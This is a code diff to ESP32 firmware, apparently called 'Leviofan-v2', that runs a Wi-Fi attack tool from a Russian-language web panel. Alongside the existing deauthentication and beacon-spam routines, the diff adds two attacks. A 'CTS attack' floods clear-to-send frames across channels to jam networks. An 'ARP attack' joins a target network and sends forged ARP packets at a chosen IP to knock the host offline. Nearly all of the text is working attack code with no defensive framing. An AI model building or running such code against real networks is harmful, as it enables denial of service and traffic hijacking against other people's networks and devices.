@@ -12,6 +12,8 @@ bool isRunning = false;
 bool isRunningBeacon = false;
 bool isRunningAuto = false;
 bool isRunningSkibidi = false;
+bool isRunningCts = false;
+bool isRunningArp = false;
 AccessPoint* aps;
 std::vector<AccessPoint> targets;
 uint8_t found;
@@ -19,7 +21,11 @@ unsigned long it = 1;
 unsigned long worktime = 20000;  //time to rescan in ms
 unsigned long uptime;
 uint8_t target[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }; //broadcast
-uint8_t tip[4] = { 192, 168, 0, 2 };
+uint8_t tip[4] = { 192, 168, 1, 1 };
+bool isConnected = false;
+int errorConnCode = 0;
+char* targetSSID;
+char* targetPassword;
 
 void handleRoot() {
     String html = R"(
@@ -164,6 +170,10 @@ void handleRoot() {
     <form method="post" action="/auto">
         <input type="submit" value="Автоматический режим )" + String(isRunningAuto?"<Выкл>":"<Вкл>") + R"(", class="btn">
     </form>
+    <form method="post" action="/cts">
+        <input type="submit" value="CTS attack )" + String(isRunningCts?"<Выкл>":"<Вкл>") + R"(", class="btn">
+    </form>
+    <button class="btn" onclick="location.href='/arp'">ARP attack</button>
     <center><p><br>------Fun mode------</br></p></center>
     <form method="post" action="/skibidi">
         <input type="submit" value="Шкибиди тойлет <не работает(>", class="btn">
@@ -182,9 +192,142 @@ void handleRoot() {
     server.send(200, "text/html", html);
 }
 
+
+void handleArp() {
+    String html = R"(
+        <!DOCTYPE html>
+        <html lang="ru">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Leviofan-v2</title>
+        </head>
+        <body>
+        <style>
+            html, body {
+               height: 100vh; /* Занимает весь доступный размер экрана */
+               margin: 0; /* Убираем отступы */
+               padding: 0; /* Убираем отступы */
+            }
+
+            body {
+                font-family: Arial, sans-serif;
+                margin: 0;
+                padding: 0;
+                background:rgba(147, 233, 255, 0.75);
+            }
+            h1 {
+                text-align: center;
+                margin-top: 20px;
+                font: 700 36px/1.2 'Roboto', sans-serif;
+            }
+
+            .btn {
+                display: inline-block;
+                text-align: center;
+                text-decoration: none;
+                margin: 2px 0;
+                border: solid 1px transparent;
+                border-radius: 4px;
+                padding: 0.5em 1em;
+                color:rgb(0, 0, 0);
+                background-color:rgb(186, 230, 255);
+            }
+            </style>
+            <h1>ARP attack page</h1>
+                            <form action="/submitWifi" method="POST">
+                            <input type="text" name="SSID" placeholder="Введите название AP..." required>
+                            <br>
+                            <input type="text" name="password" placeholder="Введите пароль от AP..." required>
+                            <input type="submit" value="Подключиться">
+                            <input type="text" name="targetIP" placeholder="Введите IP-адрес цели" >
+                            </form>
+                            <br>
+                            </body>
+                            )";
+                html += "<p>Статус:" + String(isConnected ? "Подключено" : "Не подключено") + "</p><p>Код ошибки:" + String(errorConnCode) + "</p>";
+                html += R"(
+                            </br>
+                            <form method="post" action="/startArp">
+                                <input type="submit" value="Шатдаун )";
+                html += String(isRunningArp ? "<Выкл>" : "<Вкл>");
+                html += R"(", class="btn">
+                            </form>
+            </body>
+    )";
+    server.send(200, "text/html", html);
+}
+
+void handleStartArp() {
+    if (WiFi.status() != WL_CONNECTED) {
+        server.send(200, "text/plain", "Not connected to WiFi");
+        return;
+    }
+    isRunningArp = !isRunningArp;
+    server.send(200, "text/plain", "Activating....");
+}
+
+void handleGetData() {
+    if (server.hasArg("SSID") && server.hasArg("password")) {
+        uint8_t ssid_len = server.arg("SSID").length();
+        uint8_t pass_len = server.arg("password").length();
+        if (targetSSID != nullptr) {
+            free(targetSSID);
+            targetSSID = nullptr;
+        }
+        if (targetPassword != nullptr) {
+            free(targetPassword);
+            targetPassword = nullptr;
+        }
+        targetSSID = (char*)malloc(ssid_len + 1);
+        targetPassword = (char*)malloc(pass_len + 1);
+        for (uint8_t i = 0; i < ssid_len; i++) {
+            targetSSID[i] = server.arg("SSID")[i];
+        }
+        targetSSID[ssid_len] = '\0'; // Null-terminate the string
+        for (uint8_t i = 0; i < pass_len; i++) {
+            targetPassword[i] = server.arg("password")[i];
+        }
+        targetPassword[pass_len] = '\0'; // Null-terminate the string
+        Serial.printf("SSID: %s, Password: %s\n", targetSSID, targetPassword);
+        uint8_t status = connect_wifi(targetSSID, targetPassword);
+    } else {
+        isConnected = false;
+        errorConnCode = 100; // Error code for missing arguments
+    }
+    if (server.hasArg("targetIP")) {
+        Serial.println("IP selected");
+        String targetIP = server.arg("targetIP");
+        if (targetIP.length() > 0) {
+            int dot1 = targetIP.indexOf('.');
+            int dot2 = targetIP.indexOf('.', dot1 + 1);
+            int dot3 = targetIP.indexOf('.', dot2 + 1);
+            if (dot1 != -1 && dot2 != -1 && dot3 != -1) {
+                String ipPart1 = targetIP.substring(0, dot1);
+                String ipPart2 = targetIP.substring(dot1 + 1, dot2);
+                String ipPart3 = targetIP.substring(dot2 + 1, dot3);
+                String ipPart4 = targetIP.substring(dot3 + 1);
+                if (ipPart1.length() > 0 && ipPart2.length() > 0 && ipPart3.length() > 0 && ipPart4.length() > 0) {
+                    tip[0] = ipPart1.toInt();
+                    tip[1] = ipPart2.toInt();
+                    tip[2] = ipPart3.toInt();
+                    tip[3] = ipPart4.toInt();
+                    Serial.printf("Target IP set to: %d.%d.%d.%d\n", tip[0], tip[1], tip[2], tip[3]);
+                } else {
+                    Serial.println("Invalid IP address format");
+                }
+            } else {
+                Serial.println("Invalid IP address format");
+            }
+        }
+    }
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.softAP(SSID, PASSWORD, CHANNEL, 0, 1);
+}
+
 void handleMemchk() {
     server.send(200, "text/plain", String(ESP.getFreeHeap()));
-  heap_caps_print_heap_info( MALLOC_CAP_INTERNAL );
+    heap_caps_print_heap_info( MALLOC_CAP_INTERNAL );
 
 }
 
@@ -237,6 +380,7 @@ void handleRun() {
                 memcpy(&aps[i], &targets[i], sizeof(AccessPoint));
         }
     }
+    Serial.printf("isRunning: %d\n", isRunning);
 }
 
 void handleExport() {
@@ -284,6 +428,12 @@ void handleSkibidi() {
     isRunningSkibidi = !isRunningSkibidi;
 }
 
+void handleCts() {
+    server.sendHeader("Location", "/");
+    server.send(301);
+    isRunningCts = !isRunningCts;
+}
+
 void createServer() {
     server.begin(80);
     server.on("/", handleRoot);
@@ -295,28 +445,33 @@ void createServer() {
     server.on("/auto", handleAuto);
     server.on("/skibidi", handleSkibidi);
     server.on("/memchk", handleMemchk);
+    server.on("/cts", handleCts);
+    server.on("/arp", handleArp);
+    server.on("/submitWifi", HTTP_POST, handleGetData);
+    server.on("/startArp", handleStartArp);
 }
 
 void tickServer() {
     server.handleClient();
 }
 
+uint8_t esp_mac_addr[MAC_ADDRESS_LENGTH];   // ESP MAC address
+
 //=======================================================================
 //                     SETUP
 //=======================================================================
 void setup() {
-  Serial.begin(115200);
-  WiFi.mode(WIFI_AP);
-  WiFi.softAP(SSID, PASSWORD, CHANNEL, 0, 1);
-  initScan(&found);
-  aps = scan();
-  uptime = millis();
-  clearRescan();
-  createServer();
-  prepareSave();
-  spammerPreparer();
-  //skibidiPreparer();
-  Serial.print("End of init\n");
+    Serial.begin(115200);
+    WiFi.disconnect(true, true);  // yay i love esp32
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.softAP(SSID, PASSWORD, CHANNEL, 0, 1);
+    uptime = millis();
+    clearRescan();
+    createServer();
+    prepareSave();
+    spammerPreparer();
+    WiFi.macAddress(esp_mac_addr);  // Get ESP32 MAC address
+    Serial.println("End of init.");
 }
 
 
@@ -324,37 +479,71 @@ void setup() {
 //                        LOOP
 //=======================================================================
 void loop() {
-  tickServer();
-static unsigned long lastDeauthTime = 0;
-static unsigned long lastBeaconTime = 0;
-const unsigned long deauthInterval = 1000 / maxDeauthPacketsPerSecond;
-const unsigned long beaconInterval = 1000 / maxBeaconPacketsPerSecondForAP;
+    tickServer();
+    static unsigned long lastDeauthTime = 0;
+    static unsigned long lastBeaconTime = 0;
+    static unsigned long deauthInterval = 1000 / maxDeauthPacketsPerSecond;
+    static unsigned long beaconInterval = 1000 / maxBeaconPacketsPerSecondForAP;
+    static unsigned long lastCts = 0;
+    static unsigned long ctsPacketsPerSecond = 700000;
+    static unsigned long ctsCounter = 0;
+    static unsigned long ctsInterval = 1000 / ctsPacketsPerSecond;
+    static unsigned long lastArp = 0;
+    static unsigned long arpPacketsPerSecond = 10;
+    static unsigned long arpCounter = 0;
+    static unsigned long arpInterval = 1000 / arpPacketsPerSecond;
 
-if (isRunning) {
-    if (isRunningAuto && worktime <= millis() - uptime) {
-            Serial.printf("%u", uptime);
-            Serial.print("Rescanning...\n");
-            initScan(&found);
-            free(aps);
-            aps = scan();
-            uptime = millis();
-            it = 0;
+    if (isRunning) {
+        if (isRunningAuto && worktime <= millis() - uptime) {
+                Serial.printf("%u", uptime);
+                Serial.print("Rescanning...\n");
+                initScan(&found);
+                free(aps);
+                aps = scan();
+                uptime = millis();
+                it = 0;
+        }
+
+        if (millis() - lastDeauthTime >= deauthInterval) {
+                sendDeauthPacket(aps + it, target);
+                it++;
+                if (it >= found) {
+                        it = 0;
+                }
+                lastDeauthTime = millis();
+        }
     }
 
-    if (millis() - lastDeauthTime >= deauthInterval) {
-            sendDeauthPacket(aps + it, target);
-            it++;
-            if (it >= found) {
-                    it = 0;
-            }
-            lastDeauthTime = millis();
+    if (millis() - lastBeaconTime >= beaconInterval) {
+        beaconSpammer(&isRunningBeacon);
+        lastBeaconTime = millis();
     }
-}
 
-if (millis() - lastBeaconTime >= beaconInterval) {
-    beaconSpammer(&isRunningBeacon);
-    lastBeaconTime = millis();
-}
-    //skibidiSpammer(&isRunningSkibidi);
+    if (isRunningCts) {
+        // if (millis() - lastCts > 1000) {
+        //     lastCts = millis();
+        //     ctsPacketsPerSecond = ctsCounter / 1;
+        //     ctsCounter = 0;
+        // }
+        // sendCtsPacket(aps + 0, target);
+        // it++;
+        // if (it >= found) {
+        //     it = 0;
+        // }
+        static uint8_t channel = 1;
+        send_cts_frame(channel, (uint16_t)-1); // sending w/o delay and with max duration
+        channel++;
+    }
+
+    if (isRunningArp) {
+        if (millis() - lastArp >= arpInterval) {
+            sendArpPacket((ipv4_t *)tip, (mac_address_t *)esp_mac_addr, (ipv4_t *)tip, (mac_address_t *)esp_mac_addr);
+            arpCounter++;
+            lastArp = millis();
+        }
+        if (arpCounter >= arpPacketsPerSecond) {
+            arpCounter = 0;
+        }
+    }
 }
 //=====================================================================
